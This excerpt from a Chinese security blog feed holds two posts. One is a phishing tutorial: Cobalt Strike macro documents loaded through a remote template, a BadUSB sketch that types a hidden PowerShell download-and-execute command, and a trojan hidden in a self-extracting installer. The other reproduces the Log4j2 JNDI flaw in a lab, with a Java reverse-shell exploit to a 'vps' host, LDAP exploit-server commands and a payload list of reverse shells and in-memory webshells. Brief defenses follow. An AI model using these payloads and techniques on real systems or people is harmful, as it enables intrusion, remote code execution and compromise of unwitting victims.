    <content type="html"><![CDATA[<h1 id="钓鱼演示合集"><a href="#钓鱼演示合集" class="headerlink" title="钓鱼演示合集"></a>钓鱼演示合集</h1><h1 id="0x1-宏文档"><a href="#0x1-宏文档" class="headerlink" title="0x1.宏文档"></a>0x1.宏文档</h1><h2 id="1-new-listener"><a href="#1-new-listener" class="headerlink" title="1.new listener"></a>1.new listener</h2><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704010.png" alt="image-20210528104056006"></p><h2 id="2-生成ms宏文档模板"><a href="#2-生成ms宏文档模板" class="headerlink" title="2.生成ms宏文档模板"></a>2.生成ms宏文档模板</h2><ul><li>cs生成payload</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704286.png" alt="image-20210528122719811"></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704513.png" alt="image-20210528122744074"></p><ul><li>新建空白文档，创建宏代码</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704173.png" alt="image-20220718074759409"></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704598.png" alt="image-20220718074824071"></p><ul><li>将生成的payload代码放到新建文档的对象里</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704075.png" alt="image-20220718075023914"></p><ul><li>另存为.dotm后缀</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704549.png" alt="image-20220718075143963"></p><h2 id="3-远程加载宏文档"><a href="#3-远程加载宏文档" class="headerlink" title="3.远程加载宏文档"></a>3.远程加载宏文档</h2><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704752.png" alt="image-20210528161619818"></p><ol><li><p>随意选择一个模板，保存在本地 （my.docx)</p></li><li><p>修改文件后缀为.zip（my.zip）并解压为文件夹</p></li><li><p>找到.&#x2F;word&#x2F;_rels&#x2F;settings.xml.rels文件，修改target为dotm宏木马模板地址</p></li></ol><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704968.png" alt="image-20220718080132174"></p><ol start="4"><li>保存文件，将所有解压文件重新压缩成zip，并修改后缀名为docx</li></ol><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704986.png" alt="image-20220718080234121"></p><ol start="5"><li>打开docx文件，启用了宏功能会自动加载远程含有宏木马的模板，主机上线</li></ol><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704388.png" alt="image-20220718080417628"></p><h1 id="0x2-BadUSB"><a href="#0x2-BadUSB" class="headerlink" title="0x2.BadUSB"></a>0x2.BadUSB</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>通过模拟移动U盘直接插入对方电脑，让对方电脑执行代码，达到干扰、控制主机或者窃取信息等目的。</p><h2 id="2-硬件材料"><a href="#2-硬件材料" class="headerlink" title="2.硬件材料"></a>2.硬件材料</h2><p>Digispark （Attiny85）开发板，淘宝上10元左右</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704914.png" alt="image-20210922154341721"></p><h2 id="3-生成powershell远程加载payload"><a href="#3-生成powershell远程加载payload" class="headerlink" title="3.生成powershell远程加载payload"></a>3.生成powershell远程加载payload</h2><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704239.png" alt="image-20210922155149125"></p><h2 id="4-安装Digispark-（Attiny85）开发板驱动"><a href="#4-安装Digispark-（Attiny85）开发板驱动" class="headerlink" title="4.安装Digispark （Attiny85）开发板驱动"></a>4.安装Digispark （Attiny85）开发板驱动</h2><p> <img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704674.png" alt="image-20210922155450915"></p><h2 id="5-安装配置Arduino软件"><a href="#5-安装配置Arduino软件" class="headerlink" title="5.安装配置Arduino软件"></a>5.安装配置Arduino软件</h2><ul><li><p>点击文件-&gt;首选项-&gt;附加开发版管理网址</p><p>加入digistumpArduino的开发环境：</p><p><a href="https://raw.githubusercontent.com/ArminJo/DigistumpArduino/master/package_digistump_index.json">https://raw.githubusercontent.com/ArminJo/DigistumpArduino/master/package_digistump_index.json</a></p></li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704952.png" alt="image-20210922155851260"></p><ul><li>点击工具中的开发板中的开发板管理器，等待下载索引完成（可能需要使用代理），搜索并安装“Digistump AVR Boards by Digistump”</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704087.png" alt="image-20210922160120187"></p><ul><li>安装完成后在开发板中选择Digispark</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704415.png" alt="image-20210922160301624"></p><h2 id="6-代码编译上传到开发板上"><a href="#6-代码编译上传到开发板上" class="headerlink" title="6.代码编译上传到开发板上"></a>6.代码编译上传到开发板上</h2><ul><li>代码如下</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;DigiKeyboard.h&quot;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">setup</span><span class="hljs-params">()</span> &#123;<br>DigiKeyboard.delay(<span class="hljs-number">1000</span>);<br>DigiKeyboard.sendKeyStroke(<span class="hljs-number">0</span>);<br>DigiKeyboard.delay(<span class="hljs-number">500</span>);<br>DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK);<br>DigiKeyboard.delay(<span class="hljs-number">500</span>);<br>DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);<br>DigiKeyboard.delay(<span class="hljs-number">500</span>);<br>DigiKeyboard.println(<span class="hljs-string">&quot;powershell -windowstyle hidden IEX (New-Object Net.WebClient).DownloadString(&#x27;http://vps/file&#x27;)&quot;</span>);<br>DigiKeyboard.delay(<span class="hljs-number">500</span>);<br>DigiKeyboard.sendKeyStroke(KEY_CAPS_LOCK);<br>DigiKeyboard.delay(<span class="hljs-number">100</span>);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">loop</span><span class="hljs-params">()</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>编译上传</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704926.png" alt="image-20210922160627909"></p><ul><li>插入开发板，成功写入代码</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704327.png" alt="image-20210922163924630"></p><h2 id="7-效果演示"><a href="#7-效果演示" class="headerlink" title="7.效果演示"></a>7.效果演示</h2><ul><li>插入badusb进行测试，需要等待电脑识别驱动后才会进行操作（1-3s左右）</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704642.gif" alt="badusb演示"></p><h1 id="0x3-自解压安装文件捆绑"><a href="#0x3-自解压安装文件捆绑" class="headerlink" title="0x3.自解压安装文件捆绑"></a>0x3.自解压安装文件捆绑</h1><h2 id="1-准备安装文件-木马"><a href="#1-准备安装文件-木马" class="headerlink" title="1.准备安装文件+木马"></a>1.准备安装文件+木马</h2><p>左边为flash安装包，右边为cs木马，python简单免杀以及修改图标</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704817.png" alt="image-20220721224723567"></p><h2 id="2-WinRAR压缩"><a href="#2-WinRAR压缩" class="headerlink" title="2.WinRAR压缩"></a>2.WinRAR压缩</h2><ul><li>选中两个文件，右键winrar压缩，勾选自解压</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704787.png" alt="image-20220721225108121"></p><ul><li>高级-&gt;自解压选项-&gt;设置,把解压后运行的地方加上安装包和木马文件名</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704013.png" alt="image-20220721225240455"></p><ul><li>模式选择全部隐藏</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704395.png" alt="image-20220721225436805"></p><ul><li>更新选择”解压并更新文件” 和 “覆盖所有文件”，图标可自行替换，一般用被捆绑的文件图标</li></ul><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704919.png" alt="image-20220721225548122"></p><h2 id="3-效果演示"><a href="#3-效果演示" class="headerlink" title="3.效果演示"></a>3.效果演示</h2><p>直接双击做好的自解压安装包，即会运行指定木马程序</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011704109.gif" alt="自解压演示"></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
      <tag>Cobalt Strike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Log4j2 RCE漏洞复现</title>
    <link href="/2021/12/24/Log4j2-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/12/24/Log4j2-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Log4j2-RCE漏洞复现"><a href="#Log4j2-RCE漏洞复现" class="headerlink" title="Log4j2 RCE漏洞复现"></a>Log4j2 RCE漏洞复现</h1><h2 id="0x1-漏洞原理"><a href="#0x1-漏洞原理" class="headerlink" title="0x1.漏洞原理"></a>0x1.漏洞原理</h2><p>Apache Log4j2是一个开源的日志记录组件，使用非常的广泛。</p><p>日志在打印时当遇到 <code>$&#123;</code> 后，Interpolator 类以 <code>:</code> 号作为分割，将表达式内容分割成两部分，前面部分作为 prefix，后面部分作为 key。然后通过 prefix 去找对应的 lookup，通过对应的 lookup 实例调用 lookup 方法，最后将 key 作为参数带入执行。</p><h2 id="0x2-影响程序、组件及版本"><a href="#0x2-影响程序、组件及版本" class="headerlink" title="0x2.影响程序、组件及版本"></a>0x2.影响程序、组件及版本</h2><p>影响程序有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">Spring-Boot-strater-log4j2<br>Apache Struts2<br>Apache Solr<br>Apache Flink<br>Apache Druid<br>ElasticSearch<br>Flume<br>Dubbo<br>Redis<br>Logstash<br>Kafka<br>vmvare<br></code></pre></td></tr></table></figure><table><thead><tr><th>组件</th><th>影响版本</th><th>安全版本</th></tr></thead><tbody><tr><td>apache:log4j</td><td>2.0 - 2.15.0-rc1</td><td>2.15.0-rc2</td></tr></tbody></table><h2 id="0x3-漏洞复现"><a href="#0x3-漏洞复现" class="headerlink" title="0x3.漏洞复现"></a>0x3.漏洞复现</h2><ul><li><h3 id="靶场源码如下："><a href="#靶场源码如下：" class="headerlink" title="靶场源码如下："></a>靶场源码如下：</h3></li></ul><p>靶场下载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln<br><br>docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln<br><br>docker exec -it log4j_vuln_container /bin/bash<br><br>/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.evalshell.webstudy;<br><br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.http.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><br><br><span class="hljs-meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-fengxuan&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>   <span class="hljs-keyword">private</span> String message;<br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(HelloServlet.class);<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>       message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>  &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>       response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br>       response.setHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>);<br>       System.out.println(request.getQueryString());<br><br><br>       <span class="hljs-comment">// Hello</span><br>       <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();<br>       out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);<br>       out.println(<span class="hljs-string">&quot;&lt;span&gt;你好，兄弟，请用post请求来搞我！&lt;/span&gt;&quot;</span>);<br>       out.println(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>  &#125;<br><br><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>       <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;c&quot;</span>);<br>       System.out.println(name);<br>       logger.error(name);<br>       resp.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br>       resp.setHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span>);<br>       <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getWriter();<br>       out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);<br>       out.println(<span class="hljs-string">&quot;&lt;h1&gt;可恶！又被你装到了！&lt;/h1&gt;&quot;</span>);<br>       out.println(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>  &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>源码会调用log4j2组件记录post传入的参数c，可以恶意构造c参数<code>c=$&#123;jndi:ldap://dnslog&#125;</code>验证漏洞</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011714083.png" alt="image-20211213155052319"></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011714556.png" alt="image-20211213155153476"></p><p>可以在dnslog平台看到记录，说明漏洞存在。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><blockquote><p>注意：编译exp的java版本最好是低版本，防止目标主机上的jdk版本过低无法执行恶意类</p><p>此处用的是jdk8，靶机也是jdk8</p></blockquote><h4 id="原理：架设ldap服务器并生成恶意类，远程加载恶意类"><a href="#原理：架设ldap服务器并生成恶意类，远程加载恶意类" class="headerlink" title="原理：架设ldap服务器并生成恶意类，远程加载恶意类"></a>原理：架设ldap服务器并生成恶意类，远程加载恶意类</h4><p>1.编写恶意Exploit.java</p><p>反弹shell的ip和端口替换即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">Exploit</span><span class="hljs-params">()</span>&#123;<br>       <span class="hljs-keyword">try</span>&#123;<br>           <span class="hljs-comment">// 要执行的命令</span><br>           <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/vps/5656 0&gt;&amp;1&quot;</span>&#125;);<br>           pc.waitFor();<br>      &#125; <span class="hljs-keyword">catch</span>(Exception e)&#123;<br>           e.printStackTrace();<br>      &#125;<br>  &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span> &#123;<br>       <span class="hljs-type">Exploit</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​2.javac编译java代码-&gt;Exploit.class</p><p>​<img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011714799.png" alt="image-20211213155517118"></p><p>3.将编写的exp放到http服务下，并在vps上搭建ldap服务</p><p><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://exploit.class地址/#Exploit&quot; 9999</code></p><p>此时vps的ldap地址为：<code>vps:9999/Exploit</code></p><p>RCE的payload：<code>c=$&#123;jndi:ldap://vps:9999/#Exploit&#125;</code></p><p>4.vps监听shell</p><p><code>nc -nlvvp 5656</code></p><p>5.提交payload，shell反弹</p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011714306.png" alt="image-20211213160639205"></p><h4 id="通过ldap集成化工具利用"><a href="#通过ldap集成化工具利用" class="headerlink" title="通过ldap集成化工具利用"></a>通过ldap集成化工具利用</h4><p><a href="https://github.com/Jeromeyoung/JNDIExploit-1">JNDIExploit-1</a></p><p>下载安装使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/Jeromeyoung/JNDIExploit-1.git<br>cd JNDIExploit-1<br>mvn clean package -DskipTests<br>java -jar JNDIExploit-1.3-SNAPSHOT.jar -i vps -l 1389 -p 8888<br><br></code></pre></td></tr></table></figure><blockquote><p>-i:指定服务器地址</p><p>-l:指定ldap服务地址，默认1389</p><p>-p:指定http服务地址，默认3456</p></blockquote><p>发送payload:<code>c=$&#123;jndi:ldap://vps:1389/Basic/TomcatEcho&#125;</code></p><p>header加入cmd参数和执行的命令:<code>cmd: whoami</code></p><p><img src="https://hk-1259685312.cos.ap-hongkong.myqcloud.com/img202208011714645.png" alt="image-20220416120224659"></p><p>其他payload：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -jar JNDIExploit-1.3-SNAPSHOT.jar  -u<br>Supported LADP Queries：<br>* all words are case INSENSITIVE when send to ldap server<br><br>[+] Basic Queries: ldap://0.0.0.0:1389/Basic/[PayloadType]/[Params], e.g.<br>    ldap://0.0.0.0:1389/Basic/Dnslog/[domain]<br>    ldap://0.0.0.0:1389/Basic/Command/[cmd]<br>    ldap://0.0.0.0:1389/Basic/Command/Base64/[base64_encoded_cmd]<br>    ldap://0.0.0.0:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported<br>    ldap://0.0.0.0:1389/Basic/TomcatEcho<br>    ldap://0.0.0.0:1389/Basic/SpringEcho<br>    ldap://0.0.0.0:1389/Basic/WeblogicEcho<br>    ldap://0.0.0.0:1389/Basic/TomcatMemshell1<br>    ldap://0.0.0.0:1389/Basic/TomcatMemshell2  ---need extra header [shell: true]<br>    ldap://0.0.0.0:1389/Basic/JettyMemshell<br>    ldap://0.0.0.0:1389/Basic/WeblogicMemshell1<br>    ldap://0.0.0.0:1389/Basic/WeblogicMemshell2<br>    ldap://0.0.0.0:1389/Basic/JBossMemshell<br>    ldap://0.0.0.0:1389/Basic/WebsphereMemshell<br>    ldap://0.0.0.0:1389/Basic/SpringMemshell<br><br>[+] Deserialize Queries: ldap://0.0.0.0:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.<br>    ldap://0.0.0.0:1389/Deserialization/URLDNS/[domain]<br>    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]<br>    ldap://0.0.0.0:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]<br>    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported<br>    ldap://0.0.0.0:1389/Deserialization/CommonsBeanutils2/TomcatEcho<br>    ldap://0.0.0.0:1389/Deserialization/C3P0/SpringEcho<br>    ldap://0.0.0.0:1389/Deserialization/Jdk7u21/WeblogicEcho<br>    ldap://0.0.0.0:1389/Deserialization/Jre8u20/TomcatMemshell<br>    ldap://0.0.0.0:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1<br>    ldap://0.0.0.0:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells<br><br>[+] TomcatBypass Queries<br>    ldap://0.0.0.0:1389/TomcatBypass/Dnslog/[domain]<br>    ldap://0.0.0.0:1389/TomcatBypass/Command/[cmd]<br>    ldap://0.0.0.0:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]<br>    ldap://0.0.0.0:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported<br>    ldap://0.0.0.0:1389/TomcatBypass/TomcatEcho<br>    ldap://0.0.0.0:1389/TomcatBypass/SpringEcho<br>    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell1<br>    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell2  ---need extra header [shell: true]<br>    ldap://0.0.0.0:1389/TomcatBypass/TomcatMemshell3  /ateam  pass1024<br>    ldap://0.0.0.0:1389/TomcatBypass/SpringMemshell<br><br>[+] GroovyBypass Queries<br>    ldap://0.0.0.0:1389/GroovyBypass/Command/[cmd]<br>    ldap://0.0.0.0:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd]<br><br>[+] WebsphereBypass Queries<br>    ldap://0.0.0.0:1389/WebsphereBypass/List/file=[file or directory]<br>    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Dnslog/[domain]<br>    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Command/[cmd]<br>    ldap://0.0.0.0:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]<br>    ldap://0.0.0.0:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported<br>    ldap://0.0.0.0:1389/WebsphereBypass/Upload/WebsphereMemshell<br>    ldap://0.0.0.0:1389/WebsphereBypass/RCE/path=[uploaded_jar_path]   ----e.g: ../../../../../tmp/jar_cache7808167489549525095.tmp<br></code></pre></td></tr></table></figure><blockquote><p>&#x2F;Basic&#x2F;TomcatMemshell1   内存马，访问地址为：&#x2F;anything?type&#x3D;basic&amp;pass&#x3D;whoami</p><p>&#x2F;Basic&#x2F;TomcatMemshell2  的访问方式需要修改<code>冰蝎</code>客户端（请参考 <a href="https://mp.weixin.qq.com/s/n1wrjep4FVtBkOxLouAYfQ">冰蝎改造之适配基于tomcat Filter的无文件webshell</a> 的方式二自行修改），并在访问时需要添加 <code>X-Options-Ai</code> 头部，密码为<code>rebeyond</code></p></blockquote><h2 id="0x4-漏洞防御"><a href="#0x4-漏洞防御" class="headerlink" title="0x4.漏洞防御"></a>0x4.漏洞防御</h2><ol><li>采用waf对请求流量中的${jndi进行拦截（存在绕过）</li><li>采用 rasp 对lookup的调用进行阻断</li><li>设置 JVM 启动参数 - <code>Dlog4j2.formatMsgNoLookups=true</code>（log4j2版本2.10+）</li><li>更新组件log4j2 到2.15.0-rc2</li></ol>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
      <category>CVE-2021-44228</category>
      
    </categories>
    
    
    <tags>
      
      <tag>log4j2</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
